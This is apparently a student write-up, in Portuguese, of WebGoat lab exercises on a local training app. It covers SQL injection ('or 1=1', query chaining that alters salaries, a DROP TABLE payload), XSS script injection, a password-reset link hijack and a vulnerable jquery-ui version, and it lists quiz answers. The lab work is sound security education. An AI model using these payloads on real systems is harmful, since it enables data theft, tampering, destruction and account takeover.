### Injection

#### Pergunta 1.1-SQL Injection

##### 2

Retornar o departamento do empregado Bob Franco.

Para tal utilizou se a Query: `SELECT department FROM Employees WHERE first_name='Bob' AND last_name='Franco'`

Resultado obtido : Departamento de marketing.

##### 3

Alterar o departamento do empregado Tobi Barnett para 'Sales'.

Para tal utilizou se a Query: `UPDATE Employees SET department='Sales' WHERE first_name='Tobi' AND last_name='Barnett'`

Resultado obtido : 89762 Tobi Barnett Sales 77000 TA9LL

##### 4

Adicionar a coluna "phone" na tabela "employees".

Para tal utilizou se a Query: `ALTER TABLE Employees ADD phone varchar(20)`

Resultado obtido : ALTER TABLE employees ADD phone varchar(20).

##### 5

Dar permissões a um determinado grupo de utilizadores.

Para tal utilizou se a Query: `GRANT ALTER TABLE TO 'UnauthorizedUser'`

Resultado obtido :  GRANT ALTER TABLE TO UnauthorizedUser.

##### 9-String Sql Injection

Devolver todos os utilizadores da tabela onde os campos foram preenchidos por: 'Smith', 'or' e '1'='1'

Para tal utilizou se a Query: `SELECT * FROM user_data WHERE first_name="John" and last_name='Smith' or '1'='1'`

Resultado obtido : São obtidas todas as entradas da tabela pois 1=1 é uma verdade universal.

##### 10-Numeric Sql Injection

Neste passo retorna-se todos os dados da tabela 'users'. Como *User_Id* é sustetível a SQL Injection elaboramos a query
com Login_Count: 1 e User_Id: 1 or 1=1 como se pode observar em baixo.

Para tal utilizou se a Query: `SELECT * FROM user_data WHERE Login_Count=1 and userid=1 or 1=1`

Resultado obtido : São obtidas todas as entradas da tabela pois 1=1 é uma verdade universal.

##### 11- Comprometer confidencialidade com String Sql Injection

Neste passo obtem-se todos os dados da tabela 'employees'.

Para tal utilizou se a Query: `SELECT * FROM employees WHERE last_name='" + name + "' AND auth_tan= '" + auth_tan + ""`

Resultado obtido :  "You have succeeded!You have successfully compromised the confidentiality of data by viewing internal 
information that you should not have access to. Well done!"

##### 12- Comprometer integridade com Query Chaining

Neste passo, demonstra-se, usando query chaining, como é possível alterar os salários.

Para tal utilizou se a Query: `1' or 1=1; update employees set salary=125000 where first_name='John' and
last_name='Smith';--`

Resultado obtido : "Well done!Now you are earning the most money.And at the same time you sucessfully compromised the integrity
of data by changing the salary!"

##### 13- Comprometer a disponibilidade

Neste passo pretende-se apagar os registos feitos pelo utilizador.

Para tal utilizou se a Query: `Smith'; DROP TABLE access_log;--`

Resultado obtido : Apaga a tabela e todos os dados dentro da mesma.

### XSS

#### Pergunta 1.2-XSS

Nesta questão analisamos o *Cross-site Scripting* que é um tipo de vulnerabilidade. É caracterizado pela inserção de scripts maliciosos nas páginas acedidas por utilizadores. 

##### 2

Neste passo, após ter sido escrito: javascript:alert(document.cookie) na barra de endereços verificamos que as cookies são iguais. Assim, compreendemos que é possível executar scripts relacionados com cookies e que a informação apresentada era a mesma.

##### 7

Obtivemos e percebemos que o campo vulnerável era o "Enter your credit card number". Desta forma, introduzimos: <script>alert("Hey")</script>, aparecendo uma mensagem do browser a dizer Hey.

##### 10 

Neste passo, pretendemos explorar rotas que foram "esquecidas" no código para efeitos teste. No ficheiro "GoatRouter.js", após introduzirmos start.mvc#test e encontramos a route de teste.

##### 11

Introduzimos o endereço:

localhost:8080/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>
 
Inspecionamos a consola da developer tools e obtivemos um valor
Posto isto, copiamos e colamos na caixa de resposta o valor previamente obtido na consola.

##### 12

Neste passo, tivemos de responder a 5 questões de escolha múltipla. As respostas dadas foram:

* 1 - Solução 4
* 2 - Solução 3
* 3 - Solução 1
* 4 - Solução 2
* 5 - Solução 4


###  Quebra na Autenticação

#### Pergunta 1.3-Password Reset

##### 2

Tendo o Webwolf a correr e selecionando a opção "Forgot your password?, introduzimos o email e depois veridicamos a caixa de entrada, em que é-nos enviado um email com a nossa nova password. Esta foi enviada sem qualquer tipo de proteção - plaintext. Após retornar ao login do Webgoar, introduzimos o email anterior e a password recebida e obtemos: "Congratulations. You have successfully completed the assignment."

##### 4

Neste passo, observa-se a falta de segurança na recuperação da password. Esta é feita atrevés de questões básica, facilitando muito o processo de recuperação. Bastou testar diferentes cores para cada utilizador.
Desta forma, obtivemos que a chave do admin - green, bem como do tom e do larry sendo purple e yellow, respetivamente.

##### 5

A maior parte das vezes, a utilização de pergutnas de segurança, não são boas opções de verificação de identidade do user pois, apesar de haver algumas perguntas difíceis, é sempre possível adivinhar as respostas, por exemplo através do perfil das pessoas nas redes sociais ou até mesmo conhecer a vítima.

##### 6

Neste passo, percebemos que é possível dar reset da password do Tom, conhecendo unicamente o seu email, recorrendo ao link que é enviado quando se requer a reposição de password. Foi feita uma instalçao que permite intercetar e modificar pedidos. Fazemos o request de reposição de password para o email conhecido do Tom e alteramos a porta do host para 9090 (WebWolf).

Posto isto é possível observar o pedido realizado na página Incoming Requests do WebWolf. Desta forma,  copia-se o link para o URL e conseguimos aceder a uma página em que fazemos a escolha de uma nova password. Por fim, é possível fazer o login com o email do Tom e a password escolhida.

### Componentes vulneráveis

#### Pergunta 1.4-Vulnerable components

##### 5

Neste ponto usamos diferentes versões do jquery-ui : jquery-ui:1.10.2 e jquery-ui:1.12.2. Introduzimos o comando
`<script>alert('XSS')</script>` nas duas versões sendo na primeira executado e ,portanto, explorável. Na segunda versão não foi 
executado.

##### 12

Para este passo apenas foi adicionado o comando `<java.lang.Integer>1</java.lang.Integer>`.


